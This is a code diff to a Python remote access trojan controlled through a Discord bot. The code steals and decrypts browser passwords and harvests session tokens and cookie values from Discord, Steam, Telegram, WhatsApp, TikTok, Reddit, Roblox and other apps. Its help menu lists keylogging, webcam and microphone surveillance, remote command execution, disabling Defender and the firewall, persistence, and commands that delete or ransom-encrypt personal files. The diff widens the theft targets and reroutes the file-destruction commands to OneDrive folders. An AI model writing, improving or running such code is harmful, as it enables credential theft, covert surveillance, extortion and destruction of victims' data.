@@ -210,6 +210,30 @@ def get_wifipasswords():
         pass
     return profiles
 
+# ========== FOLDER HELPERS (FIXED FOR ONEDRIVE) ==========
+def get_folder_path(folder_name):
+    """Get actual Windows folder path (handles OneDrive)"""
+    folder_map = {
+        'downloads': "{374DE290-123F-4565-9164-39C4925E467B}",
+        'documents': "Personal",
+        'pictures': "My Pictures",
+        'music': "My Music",
+        'videos': "My Video",
+        'desktop': "Desktop"
+    }
+    
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
+        path = winreg.QueryValueEx(key, folder_map[folder_name])[0]
+        winreg.CloseKey(key)
+        if os.path.exists(path):
+            return path
+    except:
+        pass
+    
+    # Fallback
+    return os.path.join(os.path.expanduser('~'), folder_name.capitalize())
+
 # ========== BROWSER HISTORY ==========
 def get_browser_history(browser_name, history_db_path):
     """Get browser history from Chromium-based browsers"""
@@ -226,7 +250,6 @@ def get_browser_history(browser_name, history_db_path):
         try:
             cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
         except:
-            # Some browsers have different schema
             cursor.execute("SELECT url, title, visit_time FROM visits ORDER BY visit_time DESC LIMIT 50")
         
         for row in cursor.fetchall():
@@ -238,7 +261,7 @@ def get_browser_history(browser_name, history_db_path):
         conn.close()
         os.remove(temp_db)
         return history
-    except Exception as e:
+    except:
         return []
 
 def get_all_browser_history():
@@ -251,8 +274,7 @@ def get_all_browser_history():
         "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
         "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
         "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\History",
-        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History",
-        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data\Default\History"
+        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History"
     }
     
     for name, path in browsers.items():
@@ -312,7 +334,7 @@ def get_browser_passwords(browser_name, user_data_path):
             os.remove(temp_db)
         
         return passwords
-    except Exception as e:
+    except:
         return []
 
 def get_all_browser_passwords():
@@ -325,8 +347,7 @@ def get_all_browser_passwords():
         "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
         "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
         "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
-        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
-        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data"
+        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
     }
     
     for name, path in browsers.items():
@@ -337,9 +358,9 @@ def get_all_browser_passwords():
     
     return all_passwords, detected
 
-# ========== TOKEN GRABBER ==========
+# ========== TOKEN GRABBER (FIXED) ==========
 def grab_all_tokens():
-    """Grab tokens from Discord, Telegram, Steam, and other apps"""
+    """Grab tokens from Discord, browsers, and other apps"""
     tokens = []
     detected_apps = []
     
@@ -368,7 +389,7 @@ def grab_all_tokens():
             except:
                 pass
     
-    # Chrome tokens (cookies)
+    # Chrome cookies (OAuth tokens)
     chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
     if os.path.exists(chrome_path):
         detected_apps.append("Chrome")
@@ -379,9 +400,10 @@ def grab_all_tokens():
                 shutil.copy2(cookies_db, temp_db)
                 conn = sqlite3.connect(temp_db)
                 cursor = conn.cursor()
-                cursor.execute("SELECT host_key, name FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%'")
-                for host, name in cursor.fetchall():
-                    tokens.append(f"🍪 Cookie: {host} - {name}")
+                cursor.execute("SELECT host_key, name, value FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%refresh%'")
+                for host, name, value in cursor.fetchall():
+                    if value and len(str(value)) > 10:
+                        tokens.append(f"🍪 Cookie: {host} - {name} ({str(value)[:30]}...)")
                 conn.close()
                 os.remove(temp_db)
         except:
@@ -397,6 +419,10 @@ def grab_all_tokens():
                 matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
                 for match in matches:
                     tokens.append(f"🎮 Steam Account: {match}")
+                # Also grab steam IDs
+                matches = re.findall(r'"SteamID"\s*"([^"]+)"', data)
+                for match in matches:
+                    tokens.append(f"🎮 Steam ID: {match}")
         except:
             pass
     
@@ -427,6 +453,9 @@ def grab_all_tokens():
                     matches = re.findall(r'"accessToken":"([^"]+)"', data)
                     for match in matches:
                         tokens.append(f"⛏️ Minecraft: {match[:20]}...")
+                    matches = re.findall(r'"uuid":"([^"]+)"', data)
+                    for match in matches:
+                        tokens.append(f"⛏️ Minecraft UUID: {match}")
             except:
                 pass
     
@@ -462,36 +491,6 @@ def grab_all_tokens():
         except:
             pass
     
-    # WhatsApp
-    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
-    if os.path.exists(wa_path):
-        detected_apps.append("WhatsApp")
-        try:
-            for file in os.listdir(wa_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"token":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"💬 WhatsApp: {match[:30]}...")
-        except:
-            pass
-    
-    # Twitter/X
-    twitter_path = os.path.expanduser("~") + r"\AppData\Roaming\Twitter\Local Storage\leveldb"
-    if os.path.exists(twitter_path):
-        detected_apps.append("Twitter")
-        try:
-            for file in os.listdir(twitter_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(twitter_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'auth_token=[a-zA-Z0-9_-]+', data)
-                        for match in matches:
-                            tokens.append(f"🐦 Twitter: {match[:30]}...")
-        except:
-            pass
-    
     # Roblox
     roblox_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb"
     if os.path.exists(roblox_path):
@@ -504,6 +503,85 @@ def grab_all_tokens():
                         matches = re.findall(r'"_|ROBLOSECURITY":"([^"]+)"', data)
                         for match in matches:
                             tokens.append(f"🧱 Roblox: {match[:30]}...")
+        except:
+            pass
+    
+    # Reddit
+    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
+    if os.path.exists(reddit_path):
+        detected_apps.append("Reddit")
+        try:
+            for file in os.listdir(reddit_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"access_token":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🔴 Reddit: {match[:30]}...")
+        except:
+            pass
+    
+    # TikTok
+    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
+    if os.path.exists(tiktok_path):
+        detected_apps.append("TikTok")
+        try:
+            for file in os.listdir(tiktok_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🎵 TikTok: {match[:30]}...")
+        except:
+            pass
+    
+    # Battle.net
+    battlenet_path = os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb"
+    if os.path.exists(battlenet_path):
+        detected_apps.append("Battle.net")
+        try:
+            for file in os.listdir(battlenet_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(battlenet_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"access_token":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🎮 Battle.net: {match[:30]}...")
+        except:
+            pass
+    
+    # Telegram (session files)
+    telegram_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
+        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
+    ]
+    for path in telegram_paths:
+        if os.path.exists(path):
+            detected_apps.append("Telegram")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith(".s"):
+                        with open(os.path.join(path, file), 'rb') as f:
+                            data = f.read()
+                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
+                            for match in matches:
+                                tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
+            except:
+                pass
+    
+    # WhatsApp
+    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
+    if os.path.exists(wa_path):
+        detected_apps.append("WhatsApp")
+        try:
+            for file in os.listdir(wa_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"token":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"💬 WhatsApp: {match[:30]}...")
         except:
             pass
     
@@ -642,7 +720,7 @@ def stop_shake():
 def get_recent_downloads():
     downloads = []
     try:
-        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
+        downloads_path = get_folder_path('downloads')
         if os.path.exists(downloads_path):
             files = os.listdir(downloads_path)
             for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_path, x)), reverse=True)[:30]:
@@ -652,19 +730,6 @@ def get_recent_downloads():
                     size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
                     mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
                     downloads.append(f"📄 {f}\n   Size: {size_str} | Modified: {mtime}\n")
-        try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
-            downloads_reg = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
-            if downloads_reg and os.path.exists(downloads_reg) and downloads_reg != downloads_path:
-                files = os.listdir(downloads_reg)
-                for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_reg, x)), reverse=True)[:20]:
-                    path = os.path.join(downloads_reg, f)
-                    if os.path.isfile(path):
-                        size = os.path.getsize(path)
-                        size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
-                        downloads.append(f"📄 {f}\n   Size: {size_str}\n")
-        except:
-            pass
         return downloads if downloads else ["No recent downloads found"]
     except:
         return ["Error getting downloads"]
@@ -815,7 +880,7 @@ async def file_scramble(ctx):
         scrambled = 0
         await send_embed(ctx, "Scrambling", "Renaming files...", discord.Color.purple())
         for folder in folders:
-            folder_path = os.path.join(os.path.expanduser('~'), folder)
+            folder_path = get_folder_path(folder.lower())
             if os.path.exists(folder_path):
                 for root, dirs, files in os.walk(folder_path):
                     for file in files:
@@ -839,7 +904,7 @@ async def file_destroy(ctx):
         deleted = 0
         await send_embed(ctx, "Destroying", "Deleting files...", discord.Color.dark_red())
         for folder in folders:
-            folder_path = os.path.join(os.path.expanduser('~'), folder)
+            folder_path = get_folder_path(folder.lower())
             if os.path.exists(folder_path):
                 for root, dirs, files in os.walk(folder_path):
                     for file in files:
@@ -860,7 +925,7 @@ async def file_ransom(ctx):
         encrypted = 0
         await send_embed(ctx, "Encrypting", "Ransomware in progress...", discord.Color.dark_purple())
         for folder in folders:
-            folder_path = os.path.join(os.path.expanduser('~'), folder)
+            folder_path = get_folder_path(folder.lower())
             if os.path.exists(folder_path):
                 for root, dirs, files in os.walk(folder_path):
                     for file in files:
@@ -1114,11 +1179,10 @@ async def run_cmd(ctx, *, command: str):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== MIC COMMAND WITH FIX ==========
 @bot.command(name='mic')
 @is_authorized()
 async def mic_record(ctx, duration: int = 10):
-    """Record microphone using Windows Sound Recorder (no PyAudio required)"""
+    """Record microphone"""
     if duration < 3:
         duration = 3
     if duration > 60:
@@ -1127,40 +1191,7 @@ async def mic_record(ctx, duration: int = 10):
     await send_embed(ctx, "🎤 Recording", f"Microphone for {duration} seconds...", discord.Color.blue())
     
     try:
-        # Use Windows Sound Recorder (built into Windows 10/11)
-        output_path = os.environ['TEMP'] + "\\mic_recording.wav"
-        
-        # Start sound recorder with PowerShell
-        ps_script = f'''
-        Add-Type -AssemblyName System.Speech
-        $rec = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-        $rec.SetInputToDefaultAudioDevice()
-        $stream = New-Object System.IO.MemoryStream
-        $writer = New-Object System.Speech.AudioFormat.WaveFileWriter($stream, $rec.AudioFormat)
-        
-        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-        $frames = @()
-        
-        while ($stopwatch.Elapsed.TotalSeconds -lt {duration}) {{
-            try {{
-                $result = $rec.Recognize([System.TimeSpan]::FromSeconds(1))
-                if ($result -ne $null) {{
-                    $frames += $result.Audio.GetAudio()
-                }}
-            }} catch {{}}
-        }}
-        
-        $combined = New-Object System.IO.MemoryStream
-        foreach ($frame in $frames) {{
-            $frame.CopyTo($combined)
-        }}
-        [System.IO.File]::WriteAllBytes("{output_path}", $combined.ToArray())
-        Write-Output "DONE"
-        '''
-        
-        # Fallback - use PyAudio if available
         if AUDIO_AVAILABLE:
-            await send_embed(ctx, "🎤 Recording", f"Using PyAudio for {duration} seconds...", discord.Color.blue())
             path = record_mic(duration)
             if path and os.path.exists(path):
                 with open(path, 'rb') as f:
@@ -1169,35 +1200,11 @@ async def mic_record(ctx, duration: int = 10):
                 await send_embed(ctx, "✅ Success", "Microphone recording complete", discord.Color.green())
                 return
         
-        # If PyAudio not available, try PowerShell method
-        try:
-            # Simple alternative - use built-in Windows Sound Recorder via subprocess
-            # This works on Windows 10/11
-            import winsound
-            import wave
-            
-            # Try using Windows Sound Recorder
-            sound_recorder_path = "C:\\Windows\\System32\\SoundRecorder.exe"
-            if os.path.exists(sound_recorder_path):
-                subprocess.Popen([sound_recorder_path, '/file', output_path, '/duration', str(duration), '/format', 'wav'])
-                time.sleep(duration + 3)
-                
-                if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
-                    with open(output_path, 'rb') as f:
-                        await ctx.send(file=discord.File(f))
-                    os.remove(output_path)
-                    await send_embed(ctx, "✅ Success", "Microphone recording complete", discord.Color.green())
-                    return
-        except:
-            pass
-        
-        # If all else fails, give helpful message
         await send_embed(ctx, "⚠️ Recording Unavailable", 
             "Microphone recording failed. Try these alternatives:\n\n"
             "• `!camrec` - Record webcam video\n"
             "• `!webcampic` - Take webcam photo\n"
-            "• `!voice` - Text-to-speech\n"
-            "• `!screenshot` - Take screenshot\n\n"
+            "• `!voice` - Text-to-speech\n\n"
             "To enable microphone recording, install PyAudio:\n"
             "`pip install pyaudio`", 
             discord.Color.orange())
@@ -1459,7 +1466,6 @@ async def keylog_status(ctx):
     status = "🟢 Running" if keylog_active else "🔴 Stopped"
     await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())
 
-# ========== GRAB TOKENS ==========
 @bot.command(name='grabtokens')
 @is_authorized()
 async def grab_tokens(ctx):
@@ -1489,17 +1495,14 @@ async def grab_tokens(ctx):
         embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, or Chrome installed and logged in", inline=False)
         await ctx.send(embed=embed)
 
-# ========== ALL BROWSER PASSWORDS ==========
 @bot.command(name='password')
 @is_authorized()
 async def all_browser_passwords(ctx):
-    """Dump passwords from ALL browsers (Chrome, Edge, Brave, Opera, Vivaldi, Chromium)"""
     if not CRYPTO_AVAILABLE:
-        await send_embed(ctx, "Error", "pycryptodome not installed - password decryption unavailable", discord.Color.red())
+        await send_embed(ctx, "Error", "pycryptodome not installed", discord.Color.red())
         return
     
     await send_embed(ctx, "🔍 Dumping Passwords", "Checking all browsers...", discord.Color.blue())
-    
     passwords, detected = get_all_browser_passwords()
     
     if passwords:
@@ -1517,13 +1520,10 @@ async def all_browser_passwords(ctx):
     else:
         await send_embed(ctx, "Passwords", "No passwords found in any browser", discord.Color.red())
 
-# ========== BROWSER HISTORY ==========
 @bot.command(name='webhistory')
 @is_authorized()
 async def browser_history(ctx):
-    """Get browser history from ALL browsers"""
     await send_embed(ctx, "📜 Fetching Browser History", "Checking all browsers...", discord.Color.blue())
-    
     history, detected = get_all_browser_history()
     
     if history:
@@ -1539,6 +1539,74 @@ async def browser_history(ctx):
             await ctx.send(embed=embed)
     else:
         await send_embed(ctx, "History", "No browser history found", discord.Color.red())
+
+# ========== FOLDER COMMANDS (FIXED FOR ONEDRIVE) ==========
+@bot.command(name='downloadsfolder')
+@is_authorized()
+async def list_downloads_folder(ctx):
+    path = get_folder_path('downloads')
+    await list_files(ctx, path)
+
+@bot.command(name='documentsfolder')
+@is_authorized()
+async def list_documents_folder(ctx):
+    path = get_folder_path('documents')
+    await list_files(ctx, path)
+
+@bot.command(name='picturesfolder')
+@is_authorized()
+async def list_pictures_folder(ctx):
+    path = get_folder_path('pictures')
+    await list_files(ctx, path)
+
+@bot.command(name='musicfolder')
+@is_authorized()
+async def list_music_folder(ctx):
+    path = get_folder_path('music')
+    await list_files(ctx, path)
+
+@bot.command(name='videosfolder')
+@is_authorized()
+async def list_videos_folder(ctx):
+    path = get_folder_path('videos')
+    await list_files(ctx, path)
+
+@bot.command(name='desktopfolder')
+@is_authorized()
+async def list_desktop_folder(ctx):
+    path = get_folder_path('desktop')
+    await list_files(ctx, path)
+
+# ========== SHORTCUTS ==========
+@bot.command(name='pictures')
+@is_authorized()
+async def pictures_cmd(ctx):
+    await list_pictures_folder(ctx)
+
+@bot.command(name='music')
+@is_authorized()
+async def music_cmd(ctx):
+    await list_music_folder(ctx)
+
+@bot.command(name='videos')
+@is_authorized()
+async def videos_cmd(ctx):
+    await list_videos_folder(ctx)
+
+@bot.command(name='desktop')
+@is_authorized()
+async def desktop_cmd(ctx):
+    await list_desktop_folder(ctx)
+
+@bot.command(name='downloads')
+@is_authorized()
+async def downloads_cmd(ctx):
+    await list_downloads_folder(ctx)
+
+@bot.command(name='documents')
+@is_authorized()
+async def documents_cmd(ctx):
+    await list_documents_folder(ctx)
 
 # ========== ALIASES ==========
 @bot.command(name='sysinfo')
@@ -1676,15 +1744,6 @@ async def exit_bot(ctx):
     await send_embed(ctx, "Exiting", "Goodbye", discord.Color.dark_grey())
     sys.exit(0)
 
-@bot.command(name='downloads')
-@is_authorized()
-async def recent_downloads(ctx):
-    downloads = get_recent_downloads()
-    output = "\n".join(downloads[:30])
-    if len(output) > 1900:
-        output = output[:1900] + "..."
-    await send_embed(ctx, "📥 Recent Downloads", output, discord.Color.blue())
-
 @bot.command(name='installed')
 @is_authorized()
 async def installed_programs(ctx):
@@ -1791,36 +1850,6 @@ async def fullscreen_unlock(ctx):
     except Exception as e:
         await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
 
-@bot.command(name='downloadsfolder')
-@is_authorized()
-async def list_downloads_folder(ctx):
-    path = os.path.join(os.path.expanduser('~'), 'Downloads')
-    await list_files(ctx, path)
-
-@bot.command(name='documentsfolder')
-@is_authorized()
-async def list_documents_folder(ctx):
-    path = os.path.join(os.path.expanduser('~'), 'Documents')
-    await list_files(ctx, path)
-
-@bot.command(name='picturesfolder')
-@is_authorized()
-async def list_pictures_folder(ctx):
-    path = os.path.join(os.path.expanduser('~'), 'Pictures')
-    await list_files(ctx, path)
-
-@bot.command(name='videosfolder')
-@is_authorized()
-async def list_videos_folder(ctx):
-    path = os.path.join(os.path.expanduser('~'), 'Videos')
-    await list_files(ctx, path)
-
-@bot.command(name='desktopfolder')
-@is_authorized()
-async def list_desktop_folder(ctx):
-    path = os.path.join(os.path.expanduser('~'), 'Desktop')
-    await list_files(ctx, path)
-
 @bot.command(name='help')
 async def help_cmd(ctx):
     embed = discord.Embed(
@@ -1839,7 +1868,7 @@ async def help_cmd(ctx):
             "`info` - Get advanced system information (HWID, CPU, GPU, RAM, IP, WiFi passwords)",
             "`sysinfo` - Alias for info",
             "`idletime` - Check how long the user has been idle",
-            "`geolocate` - Get IP geolocation (city, country, ISP, map link)"
+            "`geolocate` - Get IP geolocation"
         ],
         "💀 Destructive": [
             "`lock` - Locks the PC (requires admin)",
@@ -1847,40 +1876,40 @@ async def help_cmd(ctx):
             "`filescramble` - Renames all personal files randomly",
             "`filedestroy` - Deletes all personal files (⚠️ DANGEROUS)",
             "`fileransom` - Encrypts all personal files (⚠️ DANGEROUS)",
-            "`virus` - Displays 10 fake virus warning popups",
+            "`virus` - Displays fake virus popups",
             "`delete <file>` - Delete a specific file"
         ],
         "💬 Messages & Alerts": [
             "`voice <message>` - Text-to-speech message",
-            "`msgbox <message>` - Message box popup on target PC",
-            "`rickroll` - Opens Rickroll video in browser"
+            "`msgbox <message>` - Message box popup",
+            "`rickroll` - Opens Rickroll video"
         ],
         "🎮 Control & Commands": [
             "`screenshot [name]` - Take screenshot",
-            "`open <app>` - Open application (notepad, calc, chrome, cmd)",
-            "`close <app>` - Close application by name",
+            "`open <app>` - Open application",
+            "`close <app>` - Close application",
             "`listapps [limit]` - List running applications",
             "`apps` - Alias for listapps",
-            "`cmd <command>` - Run a CMD command on target",
-            "`website <url>` - Open a website in browser"
+            "`cmd <command>` - Run a CMD command",
+            "`website <url>` - Open a website"
         ],
         "🖱️ Mouse & Keyboard": [
-            "`click [left|right|middle]` - Perform mouse click",
-            "`press <keys>` - Press keys (e.g. ctrl+c, alt+f4)",
-            "`blockinput` - Block keyboard/mouse (requires admin)",
+            "`click [left|right|middle]` - Mouse click",
+            "`press <keys>` - Press keys",
+            "`blockinput` - Block keyboard/mouse (admin)",
             "`unblockinput` - Unblock keyboard/mouse",
-            "`shake <seconds>` - Shake cursor rapidly (5-300s)",
+            "`shake <seconds>` - Shake cursor (5-300s)",
             "`shakestop` - Stop cursor shaking"
         ],
         "⚡ Power Control": [
             "`shutdown [delay]` - Shutdown PC",
             "`restart [delay]` - Restart PC",
-            "`critical` - Make process critical (admin, closing causes BSOD)",
-            "`rootkit` - Hide process as svchost.exe (admin)"
+            "`critical` - Make process critical (admin)",
+            "`rootkit` - Hide process (admin)"
         ],
         "🎵 Media & Audio": [
             "`playpause` - Play/Pause media",
-            "`nexttrack` - Skip to next track",
+            "`nexttrack` - Next track",
             "`mute` - Mute system audio",
             "`unmute` - Unmute system audio",
             "`capslock` - Toggle caps lock",
@@ -1888,29 +1917,29 @@ async def help_cmd(ctx):
             "`capslockoff` - Turn caps lock OFF"
         ],
         "🖥️ Display": [
-            "`fullscreenlock` - Hide taskbar (fullscreen lock)",
+            "`fullscreenlock` - Hide taskbar",
             "`fullscreenunlock` - Show taskbar",
-            "`wallpaper` - Change wallpaper (attach image to command)"
+            "`wallpaper` - Change wallpaper"
         ],
         "📂 Files & Navigation": [
-            "`cd <path>` - Change current directory",
+            "`cd <path>` - Change directory",
             "`dir` - List current directory",
-            "`listfiles <directory>` - List files with sizes and emojis",
-            "`download <file>` - Download a file from target",
-            "`upload` - Upload a file (attach to command)",
-            "`downloads` - Show recent downloads",
-            "`installed` - List installed programs",
-            "`downloadsfolder` - List Downloads folder",
-            "`documentsfolder` - List Documents folder",
-            "`picturesfolder` - List Pictures folder",
-            "`videosfolder` - List Videos folder",
-            "`desktopfolder` - List Desktop folder"
+            "`listfiles <directory>` - List files with details",
+            "`download <file>` - Download a file",
+            "`upload` - Upload a file",
+            "`downloads` - List Downloads folder",
+            "`documents` - List Documents folder",
+            "`pictures` - List Pictures folder",
+            "`music` - List Music folder",
+            "`videos` - List Videos folder",
+            "`desktop` - List Desktop folder",
+            "`installed` - List installed programs"
         ],
         "🎥 Surveillance": [
             "`webcampic` - Take webcam photo",
             "`camrec <seconds>` - Record webcam video (5-300s)",
             "`cam` - Alias for camrec",
-            "`mic <seconds>` - Record microphone (5-60s)",
+            "`mic <seconds>` - Record microphone",
             "`screenshot` - Take screenshot",
             "`clipboard` - Get clipboard contents",
             "`clip` - Alias for clipboard",
@@ -1922,8 +1951,8 @@ async def help_cmd(ctx):
             "`keylogstatus` - Check keylogger status"
         ],
         "🔐 Security & Stealing": [
-            "`grabtokens` - Grab tokens from: Discord, Steam, Chrome, Epic Games, Minecraft, Spotify, Riot Games, WhatsApp, Twitter, Roblox",
-            "`password` - Dump saved passwords from ALL browsers (Chrome, Edge, Brave, Opera, Vivaldi, Chromium)",
+            "`grabtokens` - Grab tokens from Discord, Steam, Chrome, Epic, Minecraft, Spotify, Riot, Reddit, TikTok, Battle.net, Telegram, WhatsApp, Roblox",
+            "`password` - Dump passwords from ALL browsers",
             "`webhistory` - Get browser history from ALL browsers",
             "`disabledefender` - Disable Windows Defender (admin)",
             "`disablefirewall` - Disable Windows Firewall (admin)",
@@ -1931,12 +1960,12 @@ async def help_cmd(ctx):
             "`enabletaskmgr` - Enable Task Manager"
         ],
         "⚙️ Process Management": [
-            "`listprocess` - List all running processes with PID",
+            "`listprocess` - List all running processes",
             "`processes` - Alias for listprocess",
-            "`prockill <name>` - Kill a process by name"
+            "`prockill <name>` - Kill a process"
         ],
         "🔁 Persistence": [
-            "`persistence` - Add to startup registry",
+            "`persistence` - Add to startup",
             "`startup add/remove` - Add/remove from startup",
             "`killswitch` - Clean traces and exit"
         ],
